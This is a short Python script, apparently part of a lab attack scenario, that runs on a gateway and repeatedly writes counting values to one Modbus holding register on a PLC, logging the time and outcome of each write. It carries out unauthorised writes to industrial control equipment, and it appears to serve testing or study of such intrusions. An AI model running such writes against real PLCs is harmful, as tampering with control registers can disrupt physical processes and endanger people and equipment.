"""Attacker's Modbus writer, run in a gateway next to the polling loop.

Opens its own Modbus/TCP connection to the plc, kept open, and writes
holding register <register> every <interval> seconds for <duration>
seconds, with values counting up from 1001 so that every write can be
told apart. Writes only, no reads. Prints one line per write: UTC time,
register, value, outcome, duration.

Copied into a gateway by run.sh and run with the standard interpreter:

    python /tmp/modbus_writer.py <duration s> <interval s> <register>

Its pid is kept in /tmp/modbus_writer.pid, so the scenario script can stop
it early.
"""

import datetime
import os
import sys
import time

from pymodbus.client import ModbusTcpClient

PLC_IP = os.environ.get("PLC_IP", "10.19.1.30")
PLC_PORT = int(os.environ.get("PLC_PORT", "502"))


def utc_now():
    now = datetime.datetime.now(datetime.timezone.utc)
    return now.strftime("%Y-%m-%dT%H:%M:%S.%f")[:-3] + "Z"


def write(client, register, value):
    if not client.connected and not client.connect():
        return "error=plc unreachable"
    try:
        wr = client.write_register(register, value, device_id=0)
    except Exception as e:
        client.close()
        return f"error={e.__class__.__name__}"
    return f"error={wr}" if wr.isError() else "ok"


def main():
    duration, interval = float(sys.argv[1]), float(sys.argv[2])
    register = int(sys.argv[3])
    with open("/tmp/modbus_writer.pid", "w") as f:
        f.write(str(os.getpid()))
    client = ModbusTcpClient(PLC_IP, port=PLC_PORT, timeout=3)
    value = 1000
    end = time.monotonic() + duration
    next_run = time.monotonic()
    while next_run < end:
        value += 1
        t, t0 = utc_now(), time.monotonic()
        result = write(client, register, value)
        ms = int((time.monotonic() - t0) * 1000)
        print(f"{t} register={register} value={value} {result} {ms}ms", flush=True)
        next_run += interval
        time.sleep(max(0.0, next_run - time.monotonic()))
    client.close()


if __name__ == "__main__":
    main()
